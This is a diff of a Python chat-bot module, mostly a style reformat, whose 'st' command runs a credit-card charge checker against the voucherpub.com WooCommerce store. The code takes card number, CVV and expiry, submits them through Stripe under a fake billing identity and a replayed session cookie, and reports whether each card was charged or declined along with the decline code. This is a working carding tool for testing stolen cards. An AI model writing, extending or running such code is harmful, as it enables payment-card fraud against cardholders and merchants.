@@ -2,7 +2,7 @@ import re
 from datetime import datetime
 
 import requests
-from requests import patch, post, Session, get
+from requests import Session, get, patch, post
 
 from ._handler import newMsg
 from ._helpers import get_text_content
@@ -503,74 +503,92 @@ def stripe_charge_gate(card_number, cvv, exp_month, exp_year):
     )
     return response.json()
 
+
 def voucher_pub(card_number, cvv, exp_mo, exp_year):
     client = Session()
     response = client.post(
-        'https://voucherpub.com/wp-admin/admin-ajax.php', data={
-            'attribute_package': '12 Months',
-            'quantity': '1',
-            'add-to-cart': '1514',
-            'product_id': '1514',
-            'variation_id': '1517',
-            'action': 'basel_ajax_add_to_cart',
-        })
+        "https://voucherpub.com/wp-admin/admin-ajax.php",
+        data={
+            "attribute_package": "12 Months",
+            "quantity": "1",
+            "add-to-cart": "1514",
+            "product_id": "1514",
+            "variation_id": "1517",
+            "action": "basel_ajax_add_to_cart",
+        },
+    )
     headers = {
-        'Content-Type': 'application/x-www-form-urlencoded',
+        "Content-Type": "application/x-www-form-urlencoded",
     }
-    data = f'type=card&owner[name]=Jenna++Oretega&owner[address][line1]=431&owner[address][state]=CA&owner[address][city]=Kozhikode&owner[address][postal_code]=10800&owner[address][country]=US&owner[email]=roseloverx%40proton.me&card[number]={card_number}&card[cvc]={cvv}&card[exp_month]={exp_mo}&card[exp_year]={exp_year}&guid=2502e27c-c4db-4af8-a601-f1d6983af82ef33d6c&muid=2cb9fdb4-d524-45a3-9b0b-ce2578e22030103b84&sid=080260f5-7cbe-4bf4-9f47-b0da61ed0ff40e6908&payment_user_agent=stripe.js%2F70a10e913%3B+stripe-js-v3%2F70a10e913&time_on_page=274979&key=pk_live_5GH8TRC8LDfgJHq9JYiER8SI00rjxbhapi'
+    data = f"type=card&owner[name]=Jenna++Oretega&owner[address][line1]=431&owner[address][state]=CA&owner[address][city]=Kozhikode&owner[address][postal_code]=10800&owner[address][country]=US&owner[email]=roseloverx%40proton.me&card[number]={card_number}&card[cvc]={cvv}&card[exp_month]={exp_mo}&card[exp_year]={exp_year}&guid=2502e27c-c4db-4af8-a601-f1d6983af82ef33d6c&muid=2cb9fdb4-d524-45a3-9b0b-ce2578e22030103b84&sid=080260f5-7cbe-4bf4-9f47-b0da61ed0ff40e6908&payment_user_agent=stripe.js%2F70a10e913%3B+stripe-js-v3%2F70a10e913&time_on_page=274979&key=pk_live_5GH8TRC8LDfgJHq9JYiER8SI00rjxbhapi"
 
-    response = post('https://api.stripe.com/v1/sources',
-                    headers=headers, data=data)
-    stripe_source = response.json()['id']
+    response = post("https://api.stripe.com/v1/sources", headers=headers, data=data)
+    stripe_source = response.json()["id"]
     params = {
-        'wc-ajax': 'checkout',
+        "wc-ajax": "checkout",
     }
-    data = 'billing_email=roseloverx%40proton.me&billing_first_name=Jenna+&billing_last_name=Oretega&billing_country=US&billing_address_1=431&billing_city=Kozhikode&billing_state=CA&billing_postcode=10800&metorik_source_type=organic&metorik_source_url=https%3A%2F%2Fwww.google.com%2F&metorik_source_mtke=(none)&metorik_source_utm_campaign=(none)&metorik_source_utm_source=google&metorik_source_utm_medium=organic&metorik_source_utm_content=(none)&metorik_source_utm_id=(none)&metorik_source_utm_term=(none)&metorik_source_session_entry=https%3A%2F%2Fvoucherpub.com%2F&metorik_source_session_start_time=2022-07-30+06%3A02%3A03&metorik_source_session_pages=6&metorik_source_session_count=1&thwcfe_price_data=&thwcfe_disabled_fields=&thwcfe_disabled_sections=&thwcfe_repeat_fields=&thwcfe_repeat_sections=&shipping_method%5B0%5D=free_shipping%3A1&payment_method=stripe&bwfan_user_consent=1&woocommerce-process-checkout-nonce=2c5472f4b9&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&stripe_source={}'.format(
-        stripe_source)
-    response = post('https://voucherpub.com/',
-                    params=params, headers=headers, data=data, cookies={
-                        'wp_woocommerce_session_6c39cd94485f6fb17cd9987e4c455fa3': 't_7a63fe491748b6ab04fd74535c0952%7C%7C1659335599%7C%7C1659331999%7C%7C59eb1f171f1b91820074316346bff97d',
-                    })
-    intent = response.json()['redirect'].split('_secret')[0].split('pi-')[1]
-    client_secret = response.json()['redirect'].split(':')[0].split('pi-')[1]
+    data = "billing_email=roseloverx%40proton.me&billing_first_name=Jenna+&billing_last_name=Oretega&billing_country=US&billing_address_1=431&billing_city=Kozhikode&billing_state=CA&billing_postcode=10800&metorik_source_type=organic&metorik_source_url=https%3A%2F%2Fwww.google.com%2F&metorik_source_mtke=(none)&metorik_source_utm_campaign=(none)&metorik_source_utm_source=google&metorik_source_utm_medium=organic&metorik_source_utm_content=(none)&metorik_source_utm_id=(none)&metorik_source_utm_term=(none)&metorik_source_session_entry=https%3A%2F%2Fvoucherpub.com%2F&metorik_source_session_start_time=2022-07-30+06%3A02%3A03&metorik_source_session_pages=6&metorik_source_session_count=1&thwcfe_price_data=&thwcfe_disabled_fields=&thwcfe_disabled_sections=&thwcfe_repeat_fields=&thwcfe_repeat_sections=&shipping_method%5B0%5D=free_shipping%3A1&payment_method=stripe&bwfan_user_consent=1&woocommerce-process-checkout-nonce=2c5472f4b9&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&stripe_source={}".format(
+        stripe_source
+    )
+    response = post(
+        "https://voucherpub.com/",
+        params=params,
+        headers=headers,
+        data=data,
+        cookies={
+            "wp_woocommerce_session_6c39cd94485f6fb17cd9987e4c455fa3": "t_7a63fe491748b6ab04fd74535c0952%7C%7C1659335599%7C%7C1659331999%7C%7C59eb1f171f1b91820074316346bff97d",
+        },
+    )
+    intent = response.json()["redirect"].split("_secret")[0].split("pi-")[1]
+    client_secret = response.json()["redirect"].split(":")[0].split("pi-")[1]
 
     data = {
-        'expected_payment_method_type': 'card',
-        'use_stripe_sdk': 'true',
-        'key': 'pk_live_5GH8TRC8LDfgJHq9JYiER8SI00rjxbhapi',
-        'client_secret': client_secret,
+        "expected_payment_method_type": "card",
+        "use_stripe_sdk": "true",
+        "key": "pk_live_5GH8TRC8LDfgJHq9JYiER8SI00rjxbhapi",
+        "client_secret": client_secret,
     }
 
     response = post(
-        f'https://api.stripe.com/v1/payment_intents/{intent}/confirm', data=data)
+        f"https://api.stripe.com/v1/payment_intents/{intent}/confirm", data=data
+    )
     if "next_action" in response.json():
-        url = response.json()['next_action']['use_stripe_sdk']['stripe_js']
+        url = response.json()["next_action"]["use_stripe_sdk"]["stripe_js"]
         get(url, headers=headers, allow_redirects=True)
 
     params = {
-        'key': 'pk_live_5GH8TRC8LDfgJHq9JYiER8SI00rjxbhapi',
-        'is_stripe_sdk': 'false',
-        'client_secret': client_secret,
+        "key": "pk_live_5GH8TRC8LDfgJHq9JYiER8SI00rjxbhapi",
+        "is_stripe_sdk": "false",
+        "client_secret": client_secret,
     }
-    response = get(f'https://api.stripe.com/v1/payment_intents/{intent}',
-                   params=params, headers=headers)
+    response = get(
+        f"https://api.stripe.com/v1/payment_intents/{intent}",
+        params=params,
+        headers=headers,
+    )
     if response.json().get("next_action") is not None:
         return "Declined", "3ds_vbv", "Your card requires additional authentication"
     if "last_payment_error" in response.json():
-        return "Declined", response.json()['last_payment_error']['decline_code'], response.json()['last_payment_error']['message']
+        return (
+            "Declined",
+            response.json()["last_payment_error"]["decline_code"],
+            response.json()["last_payment_error"]["message"],
+        )
     else:
         return "Charged", "-", "Voucher has been sent to your email"
 
-VOUCHER_PUB = '''
+
+VOUCHER_PUB = """
 **Charge/Stripe/3$**
 `CC:` **{cc}|{exp_mo}|{exp_year}|{cvv}**
 `Result:` **{result}**
 `DCode:` **{dcode}**
 `Message:** **{message}**
 `TimeTaken:** **{time}**
-'''
+"""
 
-@newMsg(pattern='st')
+
+@newMsg(pattern="st")
 async def voucherpub(e):
     try:
         arg = e.text.split(" ", 1)[1]
@@ -581,4 +599,15 @@ async def voucherpub(e):
     cc, exp_mo, exp_year, cvv = arg.split("|", 3)
     start_time = datetime.now()
     result, dcode, message = voucher_pub(cc, cvv, exp_mo, exp_year)
-    await message.edit(VOUCHER_PUB.format(cc=cc, exp_mo=exp_mo, exp_year=exp_year, cvv=cvv, result=result, dcode=dcode, message=message, time=str((datetime.now() - start_time).total_seconds() * 1000) + "ms"))
+    await message.edit(
+        VOUCHER_PUB.format(
+            cc=cc,
+            exp_mo=exp_mo,
+            exp_year=exp_year,
+            cvv=cvv,
+            result=result,
+            dcode=dcode,
+            message=message,
+            time=str((datetime.now() - start_time).total_seconds() * 1000) + "ms",
+        )
+    )
